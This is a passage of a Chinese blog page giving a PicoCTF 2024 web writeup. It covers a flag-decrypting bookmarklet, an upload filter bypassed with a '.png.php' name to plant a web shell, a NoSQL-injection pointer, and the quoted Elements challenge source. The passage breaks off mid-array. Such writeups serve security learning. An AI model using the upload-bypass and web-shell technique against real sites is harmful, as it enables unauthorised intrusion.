@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/failure.ico">
+  
+  <title>PicoCTF2024 Web Writeup | Err0r233</title>
+  <meta name="author" content="Err0r2333" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="Web" />
+  
+  <meta name="description" content="清一下存货">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PicoCTF2024 Web Writeup">
+<meta property="og:url" content="http://example.com/posts/6701.html">
+<meta property="og:site_name" content="Err0r233">
+<meta property="og:description" content="清一下存货">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/failure.ico">
+<meta property="article:published_time" content="2024-04-01T11:52:45.000Z">
+<meta property="article:modified_time" content="2024-04-01T14:12:21.486Z">
+<meta property="article:author" content="Err0r2333">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/failure.ico">
+<meta name="twitter:site" content="@Err0r2333">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner3.png');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bizhi2.png');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
+
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                        
+                                    
+                                        
+                                            <li>
+                                                <a><i class="fa fa-link"></i>链接</a>
+                                                <ul class="sub-menu">
+                                                    
+                                                        
+                                                    
+                                                </ul>
+                                            </li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Err0r233</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Err0r233</h2> <br />
+                        <span>Err0r233的个人博客</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/6701.html">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">PicoCTF2024 Web Writeup</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2024-04-01T11:52:45.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-04-01</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~47.21K
+                    
+                    字
+                </li>
+                
+                    <li id="/posts/6701.html" class="leancloud_visitors" data-flag-title="PicoCTF2024 Web Writeup">
+                        <i class="fa fa-eye"></i>
+                        <span class="leancloud-visitors-count"> </span> 次阅读
+                    </li>
+                    
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1711980741486"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><p>清一下存货</p>
+<span id="more"></span>
+<h1><span id="bookmarklet"> Bookmarklet</span></h1>
+<img src="/posts/undefined/1.png" class title="awa">
+<p>web方向的签到题</p>
+<p>打开以后能看到上图的代码</p>
+<p>然后将其放到控制台运行就能出flag了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> encryptedFlag = <span class="string">&quot;àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓ¡ÒÅ¤í&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> key = <span class="string">&quot;picoctf&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> decryptedFlag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; encryptedFlag.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      decryptedFlag += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((encryptedFlag.<span class="title function_">charCodeAt</span>(i) - key.<span class="title function_">charCodeAt</span>(i % key.<span class="property">length</span>) + <span class="number">256</span>) % <span class="number">256</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">alert</span>(decryptedFlag);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<h1><span id="webdecode"> WebDecode</span></h1>
+<p>打开f12查几个页面，在<code>about.html</code>的一个隐秘的地方发现了一串神秘字符串</p>
+<img src="/posts/undefined/2.png" class title="awa">
+<p>放进赛博厨子就能解出来</p>
+<h1><span id="unminify"> Unminify</span></h1>
+<p>利用burp的内置浏览器打开f12即可，或者将f12后的源码直接复制到vscode中：</p>
+<img src="/posts/undefined/3.png" class title="awa">
+<img src="/posts/undefined/4.png" class title="awa">
+<h1><span id="introtoburp"> IntroToBurp</span></h1>
+<p>抽象题</p>
+<img src="/posts/undefined/5.png" class title="awa">
+<h1><span id="trickster"> Trickster</span></h1>
+<p>简单的文件上传，利用<code>.png.php</code>即可绕过</p>
+<p>再不行就加个PNG头</p>
+<img src="/posts/undefined/6.png" class title="awa">
+<img src="/posts/undefined/7.png" class title="awa">
+<p>改一下用蚁剑连就好</p>
+<h1><span id="no-sql-injection"> No SQL Injection</span></h1>
+<p>抽象题目2</p>
+<p>利用burp</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jklbnm12/article/details/120423608?ops_request_misc=%7B%22request%5Fid%22%3A%22171029711716777224478228%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=171029711716777224478228&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-120423608-null-null.142%5Ev99%5Epc_search_result_base3&amp;utm_term=NoSQL%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187">Nosql 注入从零到一_nosql注入-CSDN博客</a></p>
+<img src="/posts/undefined/8.png" class title="awa">
+<h1><span id="elements"> Elements</span></h1>
+<p>接下来我要向您隆重介绍本次PicoCTF的抽象集大成者题目：Elements!</p>
+<p>赛时：</p>
+<p>如果对手是elements这种题目的话，可能会有点棘手呢？</p>
+<p>会ak的！</p>
+<p>你(elements)才是挑战者！</p>
+<p>赛后：</p>
+<p>没有让elements大人使出全力真是抱歉</p>
+<p>好了，看下这个b题是啥玩意</p>
+<p>背景是一个在线合成网站，将两种元素放在一起就能合成新元素，而系统给了我们四种初始元素</p>
+<p>其源码如下：</p>
+<p>index.mjs</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createServer &#125; <span class="keyword">from</span> <span class="string">&#x27;node:http&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> assert <span class="keyword">from</span> <span class="string">&#x27;node:assert&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; spawn &#125; <span class="keyword">from</span> <span class="string">&#x27;node:child_process&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; mkdir, mkdtemp, writeFile, rm, readFile &#125; <span class="keyword">from</span> <span class="string">&#x27;node:fs/promises&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; tmpdir &#125; <span class="keyword">from</span> <span class="string">&#x27;node:os&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; join &#125; <span class="keyword">from</span> <span class="string">&#x27;node:path&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sleep</span> = delay =&gt; <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">setTimeout</span>(res, delay));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> html = <span class="keyword">await</span> <span class="title function_">readFile</span>(<span class="string">&#x27;static/index.html&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> js = <span class="keyword">await</span> <span class="title function_">readFile</span>(<span class="string">&#x27;static/index.js&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> flag = <span class="keyword">await</span> <span class="title function_">readFile</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> visiting = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">state</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (visiting) <span class="keyword">return</span>;</span><br><span class="line">	visiting = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	state = &#123;...state, flag &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">const</span> userDataDir = <span class="keyword">await</span> <span class="title function_">mkdtemp</span>(<span class="title function_">join</span>(<span class="title function_">tmpdir</span>(), <span class="string">&#x27;elements-&#x27;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">await</span> <span class="title function_">mkdir</span>(<span class="title function_">join</span>(userDataDir, <span class="string">&#x27;Default&#x27;</span>));</span><br><span class="line">	<span class="keyword">await</span> <span class="title function_">writeFile</span>(<span class="title function_">join</span>(userDataDir, <span class="string">&#x27;Default&#x27;</span>, <span class="string">&#x27;Preferences&#x27;</span>), <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">		<span class="attr">net</span>: &#123;</span><br><span class="line">			<span class="attr">network_prediction_options</span>: <span class="number">2</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> proc = <span class="title function_">spawn</span>(</span><br><span class="line">		<span class="string">&#x27;/usr/bin/chromium-browser-unstable&#x27;</span>, [</span><br><span class="line">			<span class="string">`--user-data-dir=<span class="subst">$&#123;userDataDir&#125;</span>`</span>,</span><br><span class="line">			<span class="string">&#x27;--profile-directory=Default&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;--no-sandbox&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;--js-flags=--noexpose_wasm,--jitless&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;--disable-gpu&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;--no-first-run&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;--enable-experimental-web-platform-features&#x27;</span>,</span><br><span class="line">			<span class="string">`http://127.0.0.1:8080/#<span class="subst">$&#123;Buffer.<span class="keyword">from</span>(<span class="built_in">JSON</span>.stringify(state)).toString(<span class="string">&#x27;base64&#x27;</span>)&#125;</span>`</span></span><br><span class="line">		],</span><br><span class="line">		&#123; <span class="attr">detached</span>: <span class="literal">true</span> &#125;</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">10000</span>);</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		process.<span class="title function_">kill</span>(-proc.<span class="property">pid</span>)</span><br><span class="line">	&#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line">	<span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">await</span> <span class="title function_">rm</span>(userDataDir, &#123; <span class="attr">recursive</span>: <span class="literal">true</span>, <span class="attr">force</span>: <span class="literal">true</span>, <span class="attr">maxRetries</span>: <span class="number">10</span> &#125;);</span><br><span class="line"></span><br><span class="line">	visiting = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">url</span>, <span class="string">&#x27;http://127.0.0.1&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> csp =  [</span><br><span class="line">		<span class="string">&quot;default-src &#x27;none&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;style-src &#x27;unsafe-inline&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;script-src &#x27;unsafe-eval&#x27; &#x27;self&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;frame-ancestors &#x27;none&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;worker-src &#x27;none&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;navigate-to &#x27;none&#x27;&quot;</span></span><br><span class="line">	]</span><br><span class="line"></span><br><span class="line">	<span class="comment">// no seriously, do NOT attack the online-mode server!</span></span><br><span class="line">	<span class="comment">// the solution literally CANNOT use it!</span></span><br><span class="line">	<span class="keyword">if</span> (req.<span class="property">headers</span>.<span class="property">host</span> !== <span class="string">&#x27;127.0.0.1:8080&#x27;</span>) &#123;</span><br><span class="line">		csp.<span class="title function_">push</span>(<span class="string">&quot;connect-src https://elements.attest.lol/&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, csp.<span class="title function_">join</span>(<span class="string">&#x27;; &#x27;</span>));</span><br><span class="line">	res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Cross-Origin-Opener-Policy&#x27;</span>, <span class="string">&#x27;same-origin&#x27;</span>);</span><br><span class="line">	res.<span class="title function_">setHeader</span>(<span class="string">&#x27;X-Frame-Options&#x27;</span>, <span class="string">&#x27;deny&#x27;</span>);</span><br><span class="line">	res.<span class="title function_">setHeader</span>(<span class="string">&#x27;X-Content-Type-Options&#x27;</span>, <span class="string">&#x27;nosniff&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (url.<span class="property">pathname</span> === <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">		res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html&#x27;</span>);</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">end</span>(html);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.<span class="property">pathname</span> === <span class="string">&#x27;/index.js&#x27;</span>) &#123;</span><br><span class="line">		res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript&#x27;</span>);</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">end</span>(js);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.<span class="property">pathname</span> === <span class="string">&#x27;/remoteCraft&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">const</span> &#123; recipe, xss &#125; = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(url.<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&#x27;recipe&#x27;</span>));</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(recipe);</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(xss);</span><br><span class="line">			<span class="title function_">assert</span>(<span class="keyword">typeof</span> xss === <span class="string">&#x27;string&#x27;</span>);</span><br><span class="line">			<span class="title function_">assert</span>(xss.<span class="property">length</span> &lt; <span class="number">300</span>);</span><br><span class="line">			<span class="title function_">assert</span>(recipe <span class="keyword">instanceof</span> <span class="title class_">Array</span>);</span><br><span class="line">			<span class="title function_">assert</span>(recipe.<span class="property">length</span> &lt; <span class="number">50</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">const</span> step <span class="keyword">of</span> recipe) &#123;</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">log</span>(step)</span><br><span class="line">				<span class="title function_">assert</span>(step <span class="keyword">instanceof</span> <span class="title class_">Array</span>);</span><br><span class="line">				<span class="title function_">assert</span>(step.<span class="property">length</span> === <span class="number">2</span>);</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">const</span> element <span class="keyword">of</span> step) &#123;</span><br><span class="line">					<span class="title function_">assert</span>(<span class="keyword">typeof</span> xss === <span class="string">&#x27;string&#x27;</span>);</span><br><span class="line">					<span class="title function_">assert</span>(element.<span class="property">length</span> &lt; <span class="number">50</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="title function_">visit</span>(&#123; recipe, xss &#125;);</span><br><span class="line">		&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">error</span>(e);</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">writeHead</span>(<span class="number">400</span>).<span class="title function_">end</span>(<span class="string">&#x27;invalid recipe!&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&#x27;visiting!&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">writeHead</span>(<span class="number">404</span>).<span class="title function_">end</span>(<span class="string">&#x27;not found&#x27;</span>);</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8080</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>index.js (bot)</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// this entire thing is basically a knockoff of infinite craft</span></span><br><span class="line"><span class="comment">// https://neal.fun/infinite-craft/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> onlineHost = <span class="string">&#x27;https://elements.attest.lol&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> buttons = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;elements&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// these were all generated by ai, yes they have some really weird results</span></span><br><span class="line"><span class="keyword">const</span> recipes = [[<span class="string">&quot;Ash&quot;</span>,<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Charcoal&quot;</span>],[<span class="string">&quot;Steam Engine&quot;</span>,<span class="string">&quot;Water&quot;</span>,<span class="string">&quot;Vapor&quot;</span>],[<span class="string">&quot;Brick Oven&quot;</span>,<span class="string">&quot;Heat Engine&quot;</span>,<span class="string">&quot;Oven&quot;</span>],[<span class="string">&quot;Steam Engine&quot;</span>,<span class="string">&quot;Swamp&quot;</span>,<span class="string">&quot;Sauna&quot;</span>],[<span class="string">&quot;Magma&quot;</span>,<span class="string">&quot;Mud&quot;</span>,<span class="string">&quot;Obsidian&quot;</span>],[<span class="string">&quot;Earth&quot;</span>,<span class="string">&quot;Mud&quot;</span>,<span class="string">&quot;Clay&quot;</span>],[<span class="string">&quot;Volcano&quot;</span>,<span class="string">&quot;Water&quot;</span>,<span class="string">&quot;Volcanic Rock&quot;</span>],[<span class="string">&quot;Brick&quot;</span>,<span class="string">&quot;Fog&quot;</span>,<span class="string">&quot;Cloud&quot;</span>],[<span class="string">&quot;Obsidian&quot;</span>,<span class="string">&quot;Rain&quot;</span>,<span class="string">&quot;Black Rain&quot;</span>],[<span class="string">&quot;Colorful Pattern&quot;</span>,<span class="string">&quot;Fire&quot;</span>,<span class="string">&quot;Rainbow Fire&quot;</span>],[<span class="string">&quot;Cloud&quot;</span>,<span 